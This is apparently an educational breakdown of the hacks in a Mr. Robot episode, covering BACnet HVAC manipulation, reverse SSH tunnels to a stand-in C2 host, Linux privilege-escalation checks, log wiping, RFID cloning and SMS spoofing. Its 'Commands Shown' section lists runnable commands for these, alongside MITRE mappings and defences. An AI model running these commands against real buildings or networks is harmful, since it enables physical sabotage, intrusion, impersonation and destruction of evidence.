# Episode 5: eps1.4_3xpl0its.wmv

## Overview

The fsociety plan moves from preparation to execution as Elliot infiltrates Steel Mountain and deploys the Raspberry Pi implant. The HVAC hack is carried out through the Building Management System (BMS), exploiting the BACnet protocol. The episode also covers privilege escalation on Linux systems, anti-forensics techniques, SSH tunneling for persistent remote access, and RFID cloning used to bypass physical access controls within the facility.

---

## Hacks & Techniques

### 1. Steel Mountain HVAC Hack Execution via Raspberry Pi

With the Raspberry Pi successfully planted inside Steel Mountain's network (as set up in Episode 4), fsociety now executes the attack remotely. The implant connects back to fsociety's command-and-control infrastructure via its cellular modem, providing a bridge into the facility's internal network.

**Attack execution sequence:**

1. **Connection establishment**: The Raspberry Pi's persistent reverse SSH tunnel activates over its cellular connection, giving fsociety operators shell access to the device inside Steel Mountain's network
2. **Internal network discovery**: From the Pi, the team performs network scanning to identify HVAC controllers, Building Management System (BMS) servers, and other connected operational technology assets
3. **BMS identification**: The team locates the BMS server managing temperature and environmental controls for the data center floor where backup tapes are stored
4. **Protocol exploitation**: Using the BACnet protocol (which lacks authentication), the team sends commands to HVAC controllers to manipulate temperature set points
5. **Temperature manipulation**: Increasing the temperature in the tape storage area to levels that will degrade or destroy the magnetic media over time, while attempting to do so gradually enough to avoid triggering immediate alarms

**Why this attack is feasible:**

- Building management networks are frequently not segmented from general IT networks
- BACnet and other industrial protocols were designed decades ago without security considerations
- HVAC controllers often have default credentials or no authentication requirements
- Physical infrastructure systems are monitored for functionality, not cybersecurity threats
- The attack causes "natural-looking" failures (overheating) rather than obvious sabotage

### 2. Building Management System (BMS) Exploitation via BACnet Protocol

BACnet (Building Automation and Control Networks) is a communication protocol designed for building automation and control systems. It is widely used in commercial buildings for HVAC, lighting, fire detection, and access control systems.

**BACnet protocol vulnerabilities:**

- **No authentication**: Standard BACnet communications have no built-in authentication mechanism. Any device on the network can read or write to any BACnet object.
- **No encryption**: All BACnet traffic is transmitted in plaintext, making it trivially observable and modifiable.
- **Broadcast discovery**: BACnet devices announce themselves on the network via broadcast, making enumeration straightforward.
- **Write access**: Most BACnet implementations allow write operations to control points (set points, schedules, overrides) without any authorization.

**BACnet attack methodology:**

```
Step 1: Discover BACnet devices on the network
    |-- Send WhoIs broadcast on UDP port 47808
    |-- Collect IAm responses with device instance numbers
    |
Step 2: Enumerate device objects and properties
    |-- Read object list from each discovered device
    |-- Identify Analog Output objects (temperature set points)
    |-- Identify Binary Output objects (on/off controls)
    |
Step 3: Manipulate environmental controls
    |-- Write new values to temperature set point objects
    |-- Override automatic control sequences
    |-- Disable alarm thresholds if accessible
    |
Step 4: Cover tracks
    |-- Restore normal-looking values to monitoring objects
    |-- Manipulate trend logs to hide the change
```

**BACnet object types relevant to the attack:**

| Object Type | ID | Purpose |
|-------------|-----|---------|
| Analog Input | 0 | Sensor readings (current temperature) |
| Analog Output | 1 | Control outputs (fan speed, valve position) |
| Analog Value | 2 | Set points and parameters |
| Binary Input | 3 | Status indicators (on/off sensors) |
| Binary Output | 4 | Control switches (on/off commands) |
| Schedule | 17 | Automated scheduling of operations |
| Trend Log | 20 | Historical data recording |

### 3. Privilege Escalation on Linux Systems

During the hack, privilege escalation techniques are employed to gain root-level access on compromised Linux systems within Steel Mountain's network, moving from an initial unprivileged foothold to full administrative control.

**Common Linux privilege escalation vectors:**

**Kernel exploits:**
- Exploiting vulnerabilities in the Linux kernel to elevate from user to root
- Famous examples: Dirty COW (CVE-2016-5195), Dirty Pipe (CVE-2022-0847), PwnKit (CVE-2021-4034)

**SUID/SGID binary exploitation:**
- Finding binaries with the SUID bit set that can be abused to execute commands as root
- Common targets: nmap (older versions with interactive mode), vim, find, bash, python

**Misconfigured sudo permissions:**
- Users granted sudo access to specific commands that can be leveraged for shell escapes
- Example: `sudo vim` -> `:!bash` provides a root shell

**Writable system files:**
- /etc/passwd (add new root user)
- /etc/shadow (modify password hashes)
- /etc/sudoers (grant sudo privileges)
- Cron job scripts run as root

**Service exploitation:**
- Exploiting services running as root that have writable configuration files or accessible sockets
- Abusing Docker group membership (docker socket access = effective root)

### 4. Anti-Forensics and Log Wiping

After executing the HVAC attack, the team employs anti-forensics techniques to destroy evidence of their presence and actions on compromised systems.

**Log wiping techniques:**

- **Selective log editing**: Rather than deleting entire log files (which itself creates a suspicious gap), selectively removing specific entries related to the intrusion
- **Timestamp manipulation**: Altering file modification times (MAC times) to obscure when files were accessed or changed
- **Log rotation exploitation**: Forcing log rotation to push incriminating entries into compressed archives, then deleting the archives
- **History file clearing**: Removing shell history entries that record commands typed by the attacker

**Anti-forensic tools and techniques:**

| Technique | Purpose |
|-----------|---------|
| shred | Securely overwrite files to prevent recovery |
| timestomp | Modify file timestamps (MACE values) |
| Log editing | Remove specific incriminating log entries |
| bash_history clearing | Remove evidence of attacker's commands |
| Swap/tmp cleaning | Remove artifacts from temporary storage |
| Memory-only tools | Use tools that never write to disk |

### 5. SSH Tunneling for Remote Access

SSH tunneling is used extensively in this episode to maintain encrypted, persistent remote access through the Raspberry Pi implant and to pivot through the Steel Mountain network.

**SSH tunnel types used:**

**Reverse SSH tunnel (Remote port forwarding):**
The Raspberry Pi initiates an outbound SSH connection to fsociety's server, creating a tunnel that allows the external server to connect back into the Pi (and thus into Steel Mountain's network).

```
Pi (inside Steel Mountain) --SSH--> fsociety C2 server
    Reverse tunnel: C2:2222 -> Pi:22
    fsociety connects to C2:2222 -> arrives at Pi's SSH
```

**Local port forwarding:**
Once connected to the Pi, operators forward local ports to access services on Steel Mountain's internal network.

```
Operator's machine:8080 -> Pi -> BMS_Server:80
    Operator opens browser to localhost:8080
    Traffic tunnels through Pi to BMS web interface
```

**Dynamic port forwarding (SOCKS proxy):**
Creating a SOCKS proxy through the Pi that allows routing any traffic into Steel Mountain's network.

```
Operator configures SOCKS proxy at localhost:1080
All traffic sent through this proxy enters Steel Mountain's network via the Pi
```

### 6. RFID Cloning with Tastic RFID Thief and HID Cloner

Physical access within Steel Mountain is facilitated by cloning RFID access cards, allowing the team to bypass card-reader-controlled doors without social engineering each individual checkpoint.

**Tastic RFID Thief:**

The Tastic RFID Thief is a long-range RFID reader concealed inside a standard project binder or clipboard. Designed by security researcher Francis Brown (Bishop Fox), it can read HID proximity cards from a distance of up to 3 feet, allowing an attacker to capture card data simply by walking past a cardholder.

**How it works:**

1. The attacker carries the Tastic device (hidden in a binder) through areas where employees have their badges clipped to their clothing
2. The long-range antenna reads the card's facility code and card number as the attacker passes nearby employees
3. Captured data is stored on a micro SD card for later retrieval
4. The attacker does not need to physically touch or see the victim's card

**HID Cloner:**

Once card data is captured, an HID ProxCard cloner writes the stolen credentials onto a blank card or key fob, creating a functional duplicate that will be accepted by the access control system.

**Cloning process:**

```
1. Capture: Tastic RFID Thief reads target card data (3-foot range)
2. Decode: Extract facility code and card number from raw data
3. Write: Program blank T5577 card with captured credentials
4. Test: Verify clone at a non-sensitive access point
5. Deploy: Use cloned card to access restricted areas
```

**Limitations and countermeasures:**

| Countermeasure | Effectiveness |
|----------------|---------------|
| Multi-factor (card + PIN) | High - PIN cannot be captured by RFID reader |
| Encrypted cards (iCLASS SE, DESFire) | High - Data is encrypted, cannot be replayed |
| Shielded card sleeves | Medium - Blocks reading when card is in sleeve |
| Card + biometric | Very High - Biometric cannot be cloned with card |
| Anomaly detection | Medium - Detects same card used at two locations simultaneously |

### 7. SET SMS Spoofing for Social Engineering

During the Steel Mountain infiltration, a suspicious floor supervisor is about to escort Elliot out before he can plant the Raspberry Pi. At the critical moment, she receives an urgent text message apparently from her husband saying he's at the hospital and "it's bad." The message was actually sent by Mobley using the **Social Engineering Toolkit (SET)** on Kali Linux with a spoofed sender number.

**Technical details:**

- **Tool**: SET (Social Engineering Toolkit) by Dave Kennedy (TrustedSec), included in Kali Linux
- **Module**: Social Engineering Attacks -> SMS Spoofing Attack Vector
- **How it works**: SET connects to an SMS gateway service, allowing the attacker to specify the target phone number, a spoofed "from" number (the husband's number), and the message body. The gateway delivers the message with the forged sender information, making it appear to originate from a trusted contact.
- **Why it works**: SMS spoofing is possible because the SS7 (Signaling System 7) protocol, which underpins global telecommunications, has no authentication mechanism for verifying sender identity. Any party with access to an SMS gateway can specify an arbitrary source number.

**SET menu flow:**

```
setoolkit
  1) Social-Engineering Attacks
    7) SMS Spoofing Attack Vector
      1) Perform a SMS Spoofing Attack
        > Set payload (custom message)
        > Set target phone number
        > Set source phone number (spoofed)
        > Send
```

**Real-world parallels:**

- SMS spoofing services are widely available online, both as legitimate business tools (for branded sender IDs) and for malicious purposes
- In 2016, Positive Technologies demonstrated SMS spoofing combined with SS7 exploitation to bypass banking two-factor authentication (2FA), intercepting one-time passwords sent via SMS
- This was the pivotal moment that saved the entire Steel Mountain operation — without the spoofed SMS distracting the supervisor, Elliot would have been escorted out and the Raspberry Pi would never have been planted

---

## Tools Used

| Tool | Purpose | Category |
|------|---------|----------|
| Raspberry Pi + cellular modem | Network implant for remote access | Hardware Hacking |
| BACnet scanning tools | BMS device discovery and manipulation | ICS/SCADA |
| SSH (OpenSSH) | Encrypted tunneling and remote access | Remote Access |
| Nmap | Internal network discovery from Pi | Reconnaissance |
| Tastic RFID Thief | Long-range RFID credential capture | Physical Security |
| HID ProxCard Cloner | Duplicate captured RFID credentials | Physical Security |
| Proxmark3 | RFID analysis and cloning | Physical Security |
| shred / srm | Secure file deletion for anti-forensics | Anti-Forensics |

---

## Commands Shown

### BACnet discovery and exploitation
```bash
# Discover BACnet devices on the network (using BACnet tools)
# Scan for BACnet devices on default port 47808
nmap -sU -p 47808 192.168.1.0/24

# Using bacnet-scan tool for device discovery
bacnet-scan -s 192.168.1.0/24

# Read BACnet device properties
bacrp 192.168.1.100 8 1234 85  # Read Object-List from device 1234

# Read current temperature set point
bacrp 192.168.1.100 2 1 85  # Read Present-Value of Analog Value object 1

# Write new temperature set point (the attack)
bacwp 192.168.1.100 2 1 85 4 95.0  # Set temperature to 95°F

# Override schedule to maintain high temperature
bacwp 192.168.1.100 17 1 85 4 "override_value"
```

### SSH tunneling commands
```bash
# Reverse SSH tunnel from Raspberry Pi to C2 server
ssh -N -R 2222:localhost:22 tunnel@c2.fsociety.net -i ~/.ssh/c2_key

# From C2 server, connect to Pi through reverse tunnel
ssh -p 2222 root@localhost

# Local port forwarding to access BMS web interface
ssh -L 8080:192.168.1.100:80 root@localhost -p 2222

# Dynamic SOCKS proxy through the Pi
ssh -D 1080 root@localhost -p 2222

# Configure proxychains to use the SOCKS proxy
# Edit /etc/proxychains.conf:
# socks5 127.0.0.1 1080

# Scan internal network through the proxy
proxychains nmap -sT -Pn 192.168.1.0/24
```

### Linux privilege escalation
```bash
# Find SUID binaries
find / -perm -4000 -type f 2>/dev/null

# Check sudo permissions
sudo -l

# Search for writable cron jobs
ls -la /etc/cron* /var/spool/cron/crontabs/

# Check for writable /etc/passwd
ls -la /etc/passwd

# Enumerate running services as root
ps aux | grep root

# Check kernel version for known exploits
uname -a
cat /etc/os-release

# Enumerate capabilities on binaries
getcap -r / 2>/dev/null
```

### Anti-forensics and log wiping
```bash
# Securely delete a file (overwrite before removal)
shred -vfz -n 5 /var/log/auth.log

# Clear bash history
history -c
cat /dev/null > ~/.bash_history
export HISTSIZE=0
unset HISTFILE

# Remove specific log entries (surgical approach)
sed -i '/192.168.1.50/d' /var/log/auth.log
sed -i '/attacker_username/d' /var/log/syslog

# Modify file timestamps to match surrounding files
touch -r /var/log/syslog.1 /var/log/syslog

# Clear wtmp/utmp (login records)
cat /dev/null > /var/log/wtmp
cat /dev/null > /var/run/utmp

# Remove temporary files and artifacts
rm -rf /tmp/.hidden_tools/
shred -u /tmp/nmap_results.txt
```

### RFID cloning
```bash
# Using Proxmark3 to read a captured HID card
proxmark3> lf hid read

# Output example:
# TAG ID: 2006ec0c86 (8365) - HID H10301 26-bit
# Facility Code: 118, Card Number: 8365

# Clone to a blank T5577 card
proxmark3> lf hid clone 2006ec0c86

# Verify the clone reads correctly
proxmark3> lf hid read

# For long-range capture using Tastic RFID Thief
# Data is logged to microSD card in format:
# TIMESTAMP, FACILITY_CODE, CARD_NUMBER, RAW_HEX
```

---

## Real-World Parallels

### Building Automation System Attacks
In 2013, researchers Billy Rios and Terry McCorkle demonstrated at the Kaspersky Security Analyst Summit that they could compromise building automation systems (including those by Tridium/Honeywell) in federal buildings, including the IRS headquarters. They found internet-facing BACnet controllers with default credentials controlling HVAC, lighting, and physical access systems. A 2019 report by Forescout identified over 9,000 building automation systems directly accessible from the internet, many running outdated firmware with known vulnerabilities.

### BACnet Protocol Exploitation
BACnet's lack of native authentication has been a recognized security concern for decades. The US Department of Homeland Security's ICS-CERT has issued multiple advisories about BACnet device vulnerabilities. In 2021, researchers demonstrated at DEF CON's ICS Village how BACnet commands could be crafted to manipulate building controls, including disabling fire suppression systems, unlocking doors, and manipulating HVAC set points. The BACnet Secure Connect (BACnet/SC) specification was developed as a response but adoption remains limited.

### RFID Cloning in Penetration Testing
The Tastic RFID Thief was created by Francis Brown of Bishop Fox and presented at Black Hat USA 2013. Brown demonstrated that most HID proximity card systems could be defeated by walking past an employee at a distance of several feet. The tool has since become standard equipment in physical penetration testing engagements. In 2020, researchers showed that even encrypted iCLASS cards could be cloned due to a global master key vulnerability, affecting an estimated one billion cards worldwide.

### SSH Tunneling in APT Operations
Advanced Persistent Threat (APT) groups routinely use SSH tunneling for command-and-control and lateral movement. The APT28 (Fancy Bear) group has been documented using SSH tunnels to pivot through compromised networks in attacks against NATO member states. The SolarWinds supply chain attack (2020) used similar tunneling techniques to maintain persistent access while blending in with normal administrative SSH traffic, demonstrating how encrypted tunnels can evade network monitoring.

### Anti-Forensics in Major Breaches
Anti-forensics techniques similar to those shown in the episode have been documented in real breaches. The 2014 JPMorgan Chase breach involved attackers who carefully cleaned logs to delay detection. The Carbanak banking malware included built-in log wiping functionality. More recently, the Hafnium group (exploiting Microsoft Exchange vulnerabilities in 2021) was observed wiping event logs, deleting web shells after use, and using timestomping to make their tools appear as legitimate system files.

---

## Tool Links

- **Proxmark3**: https://proxmark.com/
- **Tastic RFID Thief**: https://www.bishopfox.com/blog/tastic-rfid-thief
- **HID iCLASS**: hardware tool (proprietary RFID system)
- **Nmap**: https://nmap.org/
- **OpenSSL**: https://www.openssl.org/
- **BACnet tools**: https://sourceforge.net/projects/bacnet/
- **Proxychains**: https://github.com/haad/proxychains
- **Kali Linux**: https://www.kali.org/
- [SET (Social Engineering Toolkit)](https://github.com/trustedsec/social-engineer-toolkit) - SMS spoofing and social engineering automation

---

## MITRE ATT&CK Mapping

| Episode Technique | MITRE ATT&CK ID | Name | Link |
|---|---|---|---|
| Raspberry Pi implant remote access | T1200 | Hardware Additions | https://attack.mitre.org/techniques/T1200/ |
| BACnet protocol exploitation (HVAC) | T1602 | Data from Configuration Repository | https://attack.mitre.org/techniques/T1602/ |
| BACnet data manipulation (temperature) | T1565 | Data Manipulation | https://attack.mitre.org/techniques/T1565/ |
| Linux privilege escalation | T1068 | Exploitation for Privilege Escalation | https://attack.mitre.org/techniques/T1068/ |
| SUID binary abuse | T1548 | Abuse Elevation Control Mechanism | https://attack.mitre.org/techniques/T1548/ |
| SSH tunneling for C2 | T1572 | Protocol Tunneling | https://attack.mitre.org/techniques/T1572/ |
| Reverse SSH tunnel persistence | T1133 | External Remote Services | https://attack.mitre.org/techniques/T1133/ |
| Anti-forensics log wiping | T1070 | Indicator Removal | https://attack.mitre.org/techniques/T1070/ |
| Timestamp manipulation | T1070 | Indicator Removal | https://attack.mitre.org/techniques/T1070/ |
| RFID cloning for physical access | T1550 | Use Alternate Authentication Material | https://attack.mitre.org/techniques/T1550/ |
| Internal network scanning from Pi | T1046 | Network Service Discovery | https://attack.mitre.org/techniques/T1046/ |
| Secure file deletion (shred) | T1485 | Data Destruction | https://attack.mitre.org/techniques/T1485/ |
| SMS spoofing via SET for social engineering | T1598 | Phishing for Information | https://attack.mitre.org/techniques/T1598/ |

---

## References and Further Reading

- **CVE-2016-5195 (Dirty COW)**: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-5195
- **CVE-2022-0847 (Dirty Pipe)**: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-0847
- **CVE-2021-4034 (PwnKit)**: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-4034
- **Black Hat USA 2013 - Tastic RFID Thief (Bishop Fox)**: https://www.bishopfox.com/blog/tastic-rfid-thief
- **DEF CON ICS Village - BACnet Exploitation**: https://www.defcon.org/
- **DHS ICS-CERT BACnet Advisories**: https://www.cisa.gov/uscert/ics
- **Forescout - Building Automation System Exposure (2019)**: https://www.forescout.com/
- **JPMorgan Chase Breach Anti-Forensics (2014)**: https://krebsonsecurity.com/
- **Carbanak Banking Malware Analysis**: https://www.kaspersky.com/resource-center/threats/carbanak
- **Hafnium Exchange Exploitation (2021)**: https://www.microsoft.com/en-us/security/blog/2021/03/02/hafnium-targeting-exchange-servers/
- **SANS - Linux Privilege Escalation Techniques**: https://www.sans.org/white-papers/
- **BACnet Secure Connect Specification**: https://www.bacnetinternational.org/

---

## Search Tags

```
tags: [BACnet, HVAC hacking, Building Management System, Raspberry Pi, SSH tunneling, reverse tunnel, SOCKS proxy, privilege escalation, Dirty COW, SUID, anti-forensics, log wiping, shred, timestomp, RFID cloning, Tastic RFID Thief, Proxmark3, HID ProxCard, Proxychains, Nmap, ICS, SCADA, SET, setoolkit, SMS-spoofing, social-engineering]
season: 1
episode: 5
mitre: [T1200, T1602, T1565, T1068, T1548, T1572, T1133, T1070, T1550, T1046, T1485]
```